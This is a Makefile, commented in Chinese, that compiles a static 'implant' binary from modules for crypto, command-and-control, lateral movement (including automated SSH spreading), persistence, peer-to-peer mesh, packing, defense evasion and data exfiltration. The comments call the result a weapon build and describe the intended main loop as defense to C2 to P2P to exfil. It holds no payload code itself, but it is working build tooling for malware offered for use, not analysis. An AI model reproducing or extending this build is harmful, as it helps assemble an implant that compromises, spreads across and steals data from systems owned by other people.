CC      = gcc

# -D_GNU_SOURCE：CLOCK_MONOTONIC / struct timeval 等在各模块自己的 Makefile 里
#   由 _POSIX_C_SOURCE 提供，单体构建不继承，缺了会静默少编文件（见 README）。
# -fvisibility=hidden：导出表里不出现内部符号。
CFLAGS  = -std=c11 -O2 -Wall -Wextra -D_GNU_SOURCE -fvisibility=hidden

# 注意：--gc-sections 当前必须关闭。
#   src/main.c 还是占位入口，不引用任何模块；开启后链接器会把全部我方代码
#   判为不可达并裁掉。实测：裁剪版 914272 字节、我方符号 0 个；
#   不裁剪版 1295016 字节、我方符号 59 个。一个能跑但空无一物的制品，
#   比链接失败危险得多。
#   待 main.c 写成真实主循环（真正驱动 defense->c2->p2p->exfil）后再启用。
LDFLAGS =

MODS    = 00_crypto 02_c2 08_lateral 09_persistence 14_p2p 21_exfil 20_packer 19_defense 26_lateral_auto
INC     = -Iinclude $(foreach m,$(MODS),-I../$(m)/include)
SRCS    = $(foreach m,$(MODS),$(wildcard ../$(m)/src/*.c))
OBJS    = $(patsubst ../%.c,obj/%.o,$(SRCS))

# 26_lateral_auto 的 ssh 执行层要用 pipe2 / prctl 等，
# 与 14_p2p 一样依赖 _GNU_SOURCE —— 由顶层 CFLAGS 统一提供，此处不再重复。
$(shell mkdir -p obj/26_lateral_auto/src)

all: implant obj/embedcfg

# 配置烧录工具：生成 .mono_cfg 段内容（大小须与段精确相等）
obj/embedcfg: tools/embedcfg.c include/mono_embed.h
	$(CC) $(CFLAGS) $(INC) -o $@ tools/embedcfg.c

$(shell mkdir -p $(foreach m,$(MODS),obj/$(m)/src))
$(shell mkdir -p obj/tools)

# 失败即停：绝不吞编译错误。
#   旧写法是 `... || echo "FAIL: $<" >> build.log`，会静默产出残缺制品——
#   实测曾因此少编 mesh.c / node.c / relay.c 三个文件，
#   而 implant 照样链接成功、照样能跑，看起来完全正常。武器构建不允许这种静默。
obj/%.o: ../%.c
	$(CC) $(CFLAGS) $(INC) -c $< -o $@

# node.c 同时含库代码与可执行入口 main。库化时弱化它，
# 避免与 src/main.c 的入口重复定义（不改源码，保持模块可独立构建）。
obj/14_p2p/src/node.o: ../14_p2p/src/node.c
	$(CC) $(CFLAGS) $(INC) -c $< -o $@
	objcopy --weaken-symbol=main $@ $@

implant: $(OBJS) src/main.c
	$(CC) $(CFLAGS) $(INC) src/main.c $(OBJS) -o $@ -static $(LDFLAGS)

clean:
	rm -rf obj implant build.log
